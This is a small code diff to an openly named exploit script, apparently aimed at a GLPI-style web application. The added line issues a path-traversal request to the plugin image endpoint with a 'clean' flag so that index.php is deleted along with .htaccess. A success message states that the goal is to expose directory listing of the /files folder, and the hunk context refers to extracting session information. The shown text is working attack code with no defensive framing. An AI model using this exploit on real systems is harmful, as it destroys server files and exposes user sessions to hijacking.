@@ -101,6 +101,7 @@ def extractSessionsInfo(filename):
 def exploit():
     if checkVulnerable() and not checkFiles():
         requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=.htaccess&clean")
+        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=index.php&clean")
     if checkFiles(): 
         print("Exploitation successful, directory listing is now enabled on the /files folder.")
         return True
